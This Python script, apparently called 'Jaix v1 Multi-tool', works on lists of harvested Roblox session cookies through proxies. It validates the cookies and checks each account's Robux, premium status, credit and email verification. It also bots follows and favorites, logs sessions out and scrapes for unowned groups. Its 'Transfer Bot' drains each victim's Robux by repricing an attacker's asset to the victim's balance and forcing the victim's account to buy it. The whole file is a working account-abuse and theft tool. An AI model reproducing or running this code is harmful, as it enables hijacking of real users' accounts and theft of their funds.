import time, ctypes, threading, random, traceback
from datetime import date
try:
    import requests
except:
    print("looks like you forgot the install the required modules, please go to command prompt and enter these two commands:\npy -3 -m pip install requests")
    time.sleep(30)
    sys.exit()



def duplicate_checker():
    global cookies
    open('output.txt', 'w+').close()
    checked = []
    count = 0
    for cookie in cookies:
        if cookie in checked:
            print("Found Duped Cookie ==> Removing Cookie")
        else:
            checked.append(cookie)
        count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Checked {count}/{len(cookies)} cookies")


    print("Writing cookie to text file ==> Please wait")

    count = 0
    for cookie in checked:
        f = open("output.txt","a+")
        if count == 0:
            f.write(cookie)
        else:
            f.write(f"{cookie}\n")
        count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Wrote {count}/{len(checked)} cookies to text file")


    ctypes.windll.kernel32.SetConsoleTitleW(f"Done Checking Cookies")
    print("Completed checking ==> Successfully Checked")


def follow(i):
   global cookies
   global proxies
   global userid
   global proxies
   global followers
   ctypes.windll.kernel32.SetConsoleTitleW(f"Followers received: 0")
   req = requests.Session()
   req.cookies['.ROBLOSECURITY'] = i
   try:
       r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
       r = req.post('https://www.roblox.com/api/item.ashx?')
       req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
   except:
       print('Invalid cookie')

   r = req.post(f'https://friends.roblox.com/v1/users/{userid}/follow', proxies = random.choice(proxies))
   try:
       f = r.json()['errors']
       print(f"Error occurred: {r.json()}")
   except:
       if r.json()['success'] == True:
           followers += 1
           print(f"Follower user ==> Botted {followers} followers")
           ctypes.windll.kernel32.SetConsoleTitleW(f"Followers received: {followers}")
   return True


def robux_check(i):
    global robux
    global checked
    global minimum
    global proxies
    global working
    checked += 1
    robux_cookies = []
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
       r = req.get('http://www.roblox.com/mobileapi/userinfo').json()
       r = req.post('https://www.roblox.com/api/item.ashx?')
       req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
       print("Invalid Cookie")
    r = req.get("https://api.roblox.com/currency/balance",proxies = random.choice(proxies))
    try:
        z = r.json()['errors']
    except:
        robux2 = r.json()['robux']
        if robux2 > minimum:
            f = open("output.txt","a+")
            f.write(f"{robux2}:{i}\n")
            print(f"Found cookie with robux | {robux2}")
            working += 1
            robux += robux2
            ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: {robux} | Cookies Checked: {checked}/{len(cookies)}")

    return True

def premium_check(i):
    global premium
    global checked
    global proxies
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
       r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies = random.choice(proxies)).json()
       premium2 = r['IsPremium']
       if premium2 == False:
           pass
       else:
           premium += 1
           print("Found Premium Account")
           f = open("output.txt","a")
           f.write(f"{i}\n")
           f.close()

    except:
       print("Invalid Cookie")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Premium Accounts: {premium} | Checked: {checked}/{len(cookies)} ")
    return True


def credit_check(i):
    global credit
    global currency
    global checked
    global minimum
    global proxies
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
       credit_grab = req.get('https://billing.roblox.com/v1/credit').json()['balance']
       if credit_grab >= minimum:
           credit += credit_grab
           ctypes.windll.kernel32.SetConsoleTitleW(f"Total Credit: {currency}{credit} | Checked: {checked}/{len(cookies)} ")
           print(f"Credit Account Found ==> Account has {currency}{credit_grab}")
           f = open("output.txt","a")
           f.write(f"{currency}{credit_grab}:{i}\n")
       else:
           print("Credit Account Found ==> Below the minimum that was set")
    except:
       print("Invalid Cookie")
    return True


def age_check(i):
    global checked
    global total
    global proxies
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies=random.choice(proxies)).json()
        r = req.post('https://www.roblox.com/api/item.ashx?',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        r = req.get("https://users.roblox.com/v1/users/authenticated",proxies=random.choice(proxies)).json()
        userid = (int(r['id']))
        created = req.get(f"https://users.roblox.com/v1/users/{userid}",proxies=random.choice(proxies)).json()['created']
        print(f"Authenticated Account ==> Account Created On: {created}")
        f = open("output.txt","a")
        f.write(f"{created}:{i}\n")
        total += 1
    except:
        print("Invalid Cookie")
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f"Amount of Accounts Date Creation Was Found For: {total} | Cookies Checked: {checked}/{len(cookies)}")
    return True


def cookie_check(i):
    global checked
    global valid
    global proxies
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies=random.choice(proxies)).json()
        r = req.post('https://www.roblox.com/api/item.ashx?',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        valid += 1
        print("Valid Cookie ==> Writing Cookie to output.txt")
        f = open("output.txt","a")
        f.write(f"{i}\n")
    except:
        print("Invalid Cookie")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Valid Cookies: {valid} | Cookies Checked: {checked}/{len(cookies)}")
    return True

def group_finder():
    global checked
    global valid
    global proxies
    checked += 1
    while True:
        groupid = random.randint(1000000,7000000)
        try:
            r = requests.get(f'https://groups.roblox.com/v1/groups/{groupid}',proxies=random.choice(proxies)).json()

            if ('errors' not in r) and (r['owner'] == None) and (r['publicEntryAllowed'] == True) and ('isLocked' not in r) and (r['isBuildersClubOnly'] == False):
                r = requests.get(f'https://search.roblox.com/catalog/items?CreatorID={groupid}&CreatorType=Group',proxies=random.choice(proxies)).json()
                clothes = r['TotalResults']
                if clothes > 0:
                    valid += 1
                    with open('output.txt','a+') as f:
                        f.write(f'https://www.roblox.com/groups/{groupid}\n')
                        print("Group Found ==> Unclaimed Group Found")



        except:
            pass
        ctypes.windll.kernel32.SetConsoleTitleW(f'Valid: {valid} | Checked: {checked}')

def verified_check(i):
    global checked
    global verified
    global unverified
    global proxies
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get("https://api.roblox.com/users/account-info/")
        if r.json()['Email'] == None:
            with open("output.txt","a+") as f:
                f.write(f"{i}\n")
                print("Unverified Account Found ==> Account found and written to output.txt")
                unverified += 1
        else:
            verifiedc = r.json()['Email']['IsVerified']
            if verifiedc == True:
                verified += 1
                print("Verified Account Found ==> Account was found but it is verified")
            elif verifiedc == False:
                print(f"Account has emailed linked but is pending verified ==> {r.json()['Email']}")
                unverified += 1
                with open("output.txt","a+") as f:
                    f.write(f"{i}\n")

    except:
        print("Invalid Cookie")
    ctypes.windll.kernel32.SetConsoleTitleW(f'Unverified: {unverified} | Verified: {verified} | Checked: {checked}/{len(cookies)}')


def favorite(i):
    global favorited
    global checked
    global proxies
    global id
    req = requests.Session()
    try:
        req.cookies['.ROBLOSECURITY'] = i
        r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies=random.choice(proxies)).json()
        r = req.post('https://www.roblox.com/api/item.ashx?',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        print("Invalid Cookie")
    data ={
    "itemTargetId":id,
    "favoriteType": "asset"
    }
    try:
        r = req.post("https://web.roblox.com/v2/favorite/toggle",data=data,proxies=random.choice(proxies))
        if r.json()['message'] == "Too Many Attempts":
            print("ratelimited, too many requests: retrying")
        else:
            favorited += 1
            print(f"Botted {favorited} favorite/s to game/asset: {id}")
    except:
        pass
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'Favorited: {favorited} favourites | Ran through: {checked}/{len(cookies)} cookies')


def invalidate(i):
    global checked
    checked += 1
    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = i
    try:
        r = req.get('http://www.roblox.com/mobileapi/userinfo',proxies=random.choice(proxies)).json()
        r = req.post('https://www.roblox.com/api/item.ashx?',proxies=random.choice(proxies))
        req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
    except:
        print("Cookie is already invalid")
    r = req.post("https://auth.roblox.com/v2/logout",proxies=random.choice(proxies))
    print(r.json())
    ctypes.windll.kernel32.SetConsoleTitleW(f'Checked: {checked}/{len(cookies)}')



print("""
      _      _      ___  __  __   __     __  _
     | |    / \    |_ _| \ \/ /   \ \   / / / |
  _  | |   / _ \    | |   \  /     \ \ / /  | |
 | |_| |  / ___ \   | |   /  \      \ V /   | |
  \___/  /_/   \_\ |___| /_/\_\      \_/    |_|

""")

ctypes.windll.kernel32.SetConsoleTitleW(f"Jaix v1 Multi-tool  | Developed By jaix#2020")
time.sleep(1)

format = int(input("Cookie format:\n[1] user:pass:cookie\n[2] Just cookie\n"))
cookies = open('cookies.txt','r').read().splitlines()
if format == 1:
    try:
        cookies = [cookie.split(':',2)[2] for cookie in cookies]
    except:
        print("\nYour cookies are not formatted like this, please restart the program")
        time.sleep(20)
        sys.exit()
elif format == 2:
    cookies = ['_|'+line.split('_|')[-1] for line in cookies]
else:
    print("Not a valid option, exiting program")
    time.sleep(20)
    sys.exit()
proxies = open('proxies.txt','r').read().splitlines()
proxies = [{'https':'http://'+proxy} for proxy in proxies]

print('''\n[1] Follow Bot
[2] Favorite Bot
[3] Transfer Bot
[4] Robux Checker
[5] Cookie Checker
[6] Premium Checker
[7] Account Date Created Checker
[8] Credit Checker
[9] Group Finder
[10] Cookie Invalidator
[11] Duplicate Cookie Remover
[12] Verified Account Checker
''')



option = int(input("Enter number of tool that you would like to use: "))

if option == 11:
    duplicate_checker()
elif option == 1:
    userid = int(input("Enter UserID: "))
    followers = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=follow,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully Botted ==> Completed botting process")
elif option == 4:
    open('output.txt', 'w+').close()
    minimum = int(input("Enter minimum amount of robux to look for and write to robux output.txt: "))
    print("All cookies that have robux above the minimum set will be written to output.txt in format: robux:cookie")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Robux: 0 | Cookies Checked: 0/{len(cookies)}")
    robux = 0
    checked = 0
    working = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=robux_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Sucessfully Checked Robux ==> Results written to output.txt")
elif option == 6:
    open('output.txt', 'w+').close()
    premium = 0
    checked = 0
    ctypes.windll.kernel32.SetConsoleTitleW(f"Premium Accounts: {premium} | Checked: {checked}/{len(cookies)} ")
    ts = []
    for i in cookies:
        t = threading.Thread(target=premium_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Sucessfully Checked Premium ==> Premium cookies written to output.txt")
elif option == 8:
    open('output.txt', 'w+').close()
    credit = 0.00
    currency = "$"
    checked = 0
    minimum = float(input("Enter the minimum amount of credit to look for: "))
    ts = []
    for i in cookies:
        t = threading.Thread(target=credit_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully Checked Credit ==> Credit accounts have been written to output.txt")
elif option == 7:
    open("output.txt","w+").close()
    checked = 0
    total = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=age_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully Checked Ages ==> Checked date creation, accounts have been written to output.txt with the date creation")
elif option == 5:
    open("output.txt","w+").close()
    checked = 0
    valid = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=cookie_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully Checked Cookies ==> All valid cookies were written to output.txt")

elif option == 9:
    #credits to idiocrasy for parts of the group scraper
    open("output.txt","w+").close()
    valid = 0
    checked = 0
    threadc = int(input("Enter amount of threads: "))
    time.sleep(1)
    print("Make sure you have your proxies in proxies.txt")
    for i in range(threadc):
        threading.Thread(target=group_finder).start()

    start = time.time()
elif option == 12:
    verified = 0
    unverified = 0
    checked = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=verified_check,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully Checked Verification ==> All unverified cookies were written to output.txt")
elif option == 2:
    id = int(input("Enter asset/game ID: "))
    favorited = 0
    checked = 0
    req = requests.Session()
    r = req.get(f"https://catalog.roblox.com/v1/favorites/assets/{id}/count")
    try:
        if r.json() >= 0:
            print("found game/asset")
    except:
        print("could not find game/asset")
        time.sleep(1)
        sys.exit()
    ts = []
    for i in cookies:
        t = threading.Thread(target=favorite,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print("Successfully completed favoriting ==> Bot has gone through all of the cookies")
    time.sleep(1)
    print(f"A total of {favorited} favorites were give to the asset/game id you provided!")
elif option == 10:
    checked = 0
    ts = []
    for i in cookies:
        t = threading.Thread(target=invalidate,args=(i,))
        t.start()
        ts.append(t)
        time.sleep(0.01)
    for i in ts:
        i.join()
    print(f"Checked All Cookies ==> All cookies have been expired/disabled")
elif option == 3:
    checked = 0
    total = 0
    minimum = int(input("Enter minimum amount to transfer: "))
    cookie = open('cookie.txt','r').readline().strip()
    assetid = int(input("Enter ID of asset to buy: "))
    req = requests.Session()
    req2 = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie
    r = req.get('http://www.roblox.com/mobileapi/userinfo')
    if 'mobileapi/user' not in r.url:
        print("Cookie Invalid ==> The cookie that changes the prices of the asset does not work! Exitting program")
        time.sleep(10)
        sys.exit()
    else:
        print("Cookie has been validated")
    r = req.post('https://www.roblox.com/api/item.ashx?')
    req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']

    try:
        r = requests.get(f'https://api.roblox.com/Marketplace/ProductInfo?assetId={assetid}').json()
        productid = r['ProductId']
        creatorid = r['Creator']['Id']
        print("Found Asset")
    except:
        print("Asset Invalid ==> The asset to buy is invalid! Exitting program")
        time.sleep(10)
        sys.exit()

    def change(price):
        try:
            r = req.post(f'https://itemconfiguration.roblox.com/v1/assets/{assetid}/update-price',json={'priceConfiguration': {'priceInRobux': price}},proxies=random.choice(proxies))
            if 'X-CSRF-TOKEN' in r.headers:
                req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
                toggle(price)
            if r.json() != {}:
                print(r.json())
        except:
            change(price)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: 0 | Checked: {checked}/{len(cookies)}')
    for i in cookies:
        checked += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: {total} | Checked: {checked}/{len(cookies)}')
        req2.cookies['.ROBLOSECURITY'] = i
        r = req2.get("https://www.roblox.com/mobileapi/userinfo")
        if "mobileapi/user" not in r.url:
            checked += 1
            print("Cookie is banned/invalid")
            continue
        try:
            r = req2.get('https://api.roblox.com/users/account-info').json()
            balance = r['RobuxBalance']
            if balance >= minimum:
                print(f"Robux Cookie Found ==> Cookie found with {balance} robux")
            elif balance < minimum and balance != 0:
                print(f"Robux Cookie Found ==> Cookie found with {balance} robux but is under the minimum you set!")
                continue
            elif balance == 0:
                continue
        except:
            print("Error ==> Error getting robux balance")
            cookies.append(i)
            print("Error ==> Retrying cookie towards the end")
            continue
        r = req2.post('https://www.roblox.com/api/item.ashx?')
        if 'X-CSRF-TOKEN' in r.headers:
            req2.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        change(balance)
        try:
            r = req2.post(f'https://economy.roblox.com/v1/purchases/products/{productid}',data={"expectedCurrency":1,"expectedPrice":balance,"expectedSellerId":creatorid},proxies=random.choice(proxies))
        except:
            print("Failed to purchase ==> Retrying at the end")
            cookies.append(i)
            continue
        if 'errors' in r.json():
            print(f"Following error occured: {r.json()}")
        else:
            if r.json()['purchased'] == False:
                if r.json()['reason'] == "AlreadyOwned":
                    r = req2.post('https://www.roblox.com/asset/delete-from-inventory',json={'assetId':assetid},proxies=random.choice(proxies))
                    if r.status_code != 200:
                        print("Error ==> Cookie already owns this asset but there was an error deleting it from its inventory")
                    else:
                        print("Successfully Deleted ==> Cookie already owned this asset but it has been deleted")
                        cookies.append(i)
                else:
                    print(f"Error ==> Following error occured: {r.json()}")
                    cookies.append(i)
            else:
                total += balance
                print(f"Bought asset for {balance} robux | Total: {total}")
        ctypes.windll.kernel32.SetConsoleTitleW(f'Total Robux Transferred: {total} | Checked: {checked}/{len(cookies)}')
    print("Completed Checking ==> Successfully transferred all possible robux!")
else:
    print("Error ==> An invalid option was chosen, exitting program")
    time.sleep(10)
    sys.exit()
